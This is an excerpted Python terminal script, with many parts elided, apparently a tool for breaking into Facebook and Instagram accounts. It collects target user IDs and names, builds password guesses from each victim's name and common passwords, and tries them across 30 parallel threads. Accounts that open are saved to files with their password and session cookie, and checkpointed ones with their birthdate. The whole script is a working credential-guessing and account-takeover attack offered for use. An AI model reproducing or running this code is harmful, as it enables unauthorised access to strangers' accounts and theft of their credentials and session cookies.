...
sys.stdout.write('\x1b[1;35m\x1b]2; {×} {×} \x07')
...
def Masuk():
	try:
		...
		os.system('clear')
		banner()
		print ('\n\033[1;97m%s%s%s\033[1;97m [1] = %s\033[1;97mLogin Instagram '%(U,til,K,O))
		print ('%s%s%s\033[1;97m  [2] = %s\033[1;97mLogin with Cookie '%(U,til,K,O))
		print ('%s%s%s\033[1;97m [0] = %s\033[1;91mEXIT '%(U,til,M,O))
		while True:
			rom = input ("\n%s %s\033[1;97mselecet %s: %s"%(P,O,M,K))
			if rom in(""):
...
class Menu():
	...
	def tentang(self):
		...
		if "mbasic_logout_button" not in a:
			...
			print ('%s%s [1] = %s\033[:97mHACK MULTI ID [\033[1;92m FIX]'%(U,P,O))
			print ('%s%s [2] = %s\033[:97mHACK Followers [\033[1;92m FIX]'%(U,P,O))
			print ('%s%s [4] = %s\033[:97mHACK with Comment Post'%(U,P,O))
			print ('%s%s [6] = %s\033[:97mHACK Serch Name dump'%(U,P,O))
			print ('%s%s [9] = %s\033[:97mHACK insta with login'%(U,P,O,H))
			#print ('%s•%s 10 %sSetting user agent'%(U,P,O))
			#print ('%s•%s rm %sREMOVE DATA LOGIN%(U,P,O))
			print ('%s•%s [0] = %s\033[:91mEXIT'%(U,M,O))
...
class selecetan:
	...
	def menu(self):
		...
		if slut in['',' ']:
			...
			gan = input ("\n%s%s%s\033[:97m HACK ID MULTI ! y/t%s >%s "%(U,til,O,M,K))
			if gan in[""]:
				print ('\n%s%s ERROR'%(M,til));jeda(2)
			elif gan in['y','Y']:
				try:
				...
				idt = input('%s%s %s\033[:97mUsername%s : %s'%(U,til,O,M,K))
				if idt in[""," "]:
					print ('\n%s%s ERROR'%(M,til));jeda(2)
			...
			print ("\n%s%s %s\033[:97mPASTE ID "%(U,til,O))
			idt = input('%s%s %s\033[:97mID%s : %s'%(U,til,O,M,K))
			if idt in[""," "]:
				print ('\n%s%s ERROR'%(M,til));jeda(2)
			else:
			...
			while True:
				print ("\n%s%s %sEXAMPLE : ahmad osman "%(U,til,O))
	...
	def MassalGRAPH(self, token):
		...
		for t in range(jum):
			t +=1
			idt = input('%s%s %saID %s%s%s : %s'%(U,til,O,P,t,M,K))
			if idt in['']:
				print
			elif(re.findall("\w+",idt)):
				r = requests.get("https://mbasic.facebook.com/"+idt).text
...
class Crack:
	...
	def romiy(self, id):
		...
		unikers = input('\n%s%s%s add password ? y/t%s > %s'%(U,til,O,M,K))
		if unikers in ('Y', 'y'):
				...
				if pwx == '':
					...
					def manual(brute=None):
						...
						if ind =='':
							...
							print ('\n%s%s%s %s[\033[1;92m succesfully] %stersimpan ke file %s> %succesfully/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
							print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
							jalan ('\n%s!%s\033[1;97m waiting 15 min _ 30 min\n'%(U,O));jeda(0.2)
							...
							print ('\n%s%s%s %s[\033[1;92m succesfully] %stersimpan ke file %s> %succesfully/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
							print ('%s%s%s %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
							jalan ('\n%s!%s \033[1;97m waiting 15min _ 30min\n'%(U,O));jeda(0.2)
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('|')[0]
							...
							manual()
					print ('\n%s%s [ %s\033[1;97mSelecet Methode %s]\n'%(U,O,U,O))
					print ('%s %s[1] =%s Methode %s\033[1;97mAPI  WIFI %s[\033[1:92m FAST]'%(U,P,O,M,O))
					print ('%s %s[2] = %s \033[1;97mMethode %sAPI FREE MOD %s '%(U,P,O,P,O))
					print ('%s %s[3] =%s \033[1;97mMethode %sAPI Mobile %s '%(U,P,O,H,O))
					print ('%s %s[4] =%s \033[1;97mMethode %sAPI Mobile v2')
					manual(pwx.split(','))
					break
		elif unikers in ('T', 't'):
			print ('\n%s%s [ %s\033[1;97mSelecet Methode%s ]\n'%(U,O,U,O))
			print ('%s %s[1] =%s \033[1;97mmethode %sfree %s'%(U,P,O,M,O))
			print ('%s %s[2] =%s \033[1;97mMethode %sFREE MOD %s '%(U,P,O,P,O))
			print ('%s %s[3] =%s \033[1;97mMethode %sAPI mobile %s '%(U,P,O,H,O))
			print ('%s %s[3] =%s \033[1;97mMethode %sAPI Mobile v2 %s '%(U,P,O,H,O))
			self.langsung()
		else:
	...
	def langsung(self):
		...
		if suuu == '':
			...
			print ('\n%s%s%s %s[succesfully] %s %s %succesfully/%GOOD.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
			print ('%s%s%s %s[%sCP%s]%s %s %sCP/%CP.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
			jalan ('\n%s!%s \033[1;97m waiting 15min _ 30min \n'%(U,O));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
			...
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('|')
						ss = name.split(' ')
						pwx = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345", ss[0]+"1234", "123456789", "12345678", "112233" ]
						TitidNeverDie.submit(self.basic, uid, pwx)
					except: pass
			hasil(ok,cp)
		elif suuu in ('3', '03'):
			print ('\n%s%s%s %s[succesfully] %s %s%succesfully/%GODO.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
			print ('%s%s%s %s[%sCP%s]%s %s %sCP/%CP.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
			jalan ('\n%s!%s \033[1;97m waiting 15min _ 30min \n'%(U,O));jeda(0.2)
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
	...
	def touch(self, user, manual, **data):
		...
		sys.stdout.write('\r'+warna+'\x1b[1;97m [Cracking] %s/%s [%\033[1;92msuccesfully%s:%s%s%s]-[%s\033[1;91mCHEK%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				...
				if "c_user" in ses.cookies.get_dict():
					try:
						...
						month = bulan12[month]
						print ('\r %s[succesfully]%s  %s ID : %s %s %sPASS : %s '%(H,user,pw,day,month,year,kukis))
				
						ok.append("%s : %s : %s %s %s : %s "%(user,pw,day,month,year,kukis))
						open('succesfully/%s.txt' %(waktu), 'a').write(" [succesfully] %s  %s ID : %s %s %sPASS : %s \n"%(user,pw,day,month,year,kukis))
						cek_apk(kukis)
						break
						...
						pass
					print ('\r %s[succesfully] %sID : %sPASS : %s '%(H,user,pw,kukis))
					
					ok.append('%s : %s : %s'%(user,pw,kukis))
					open('succesfully/%s.txt'%(waktu), 'a').write(' [succesfully] %sID : %sPASS : %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
					...
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[CHEK]%sID : %sPASS : %s %s %s  '%(K,user,pw,day,month,year))
	...
	def basic(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;97m [cracking] %s/%s [%succesfully%s:%s%s%s]-[%sCHEK%s:%s%s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				...
				if 'c_user' in ses.cookies.get_dict():
					...
					ok.append('%s : %s : %s'%(user,pw,kukis))
					open('succesfully/%s.txt'%(waktu), 'a').write(' *--> %s : %s : %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						...
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print ('\r %s[succesfully]%sID : %sPASS : %s %s %s  '%(K,user,pw,day,month,year))
		
						cp.append("%s : %s : %s %s %s"%(user,pw,day,month,year))
						open('CP/%s.txt' %(waktu), 'a').write("[CHEK] %sID : %sPASS : %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
...
def hasil(ok,cp):
	...
	if len(ok) != 0 or len(cp) != 0:
		print("\n%s Fnish"%(H))
		print('%s+%s ---------------------------------------- %s+'%(P,M,P))
		print('%s• %succesfully%s : %s%s'%(U,H,M,H,str(len(ok))))
		print('%s• %sCHEK%s : %s%s'%(U,K,M,K,str(len(cp))))
		print('%s+%s ---------------------------------------- %s+'%(P,M,P))
		if len(cp)==0:
			exit()
		else:
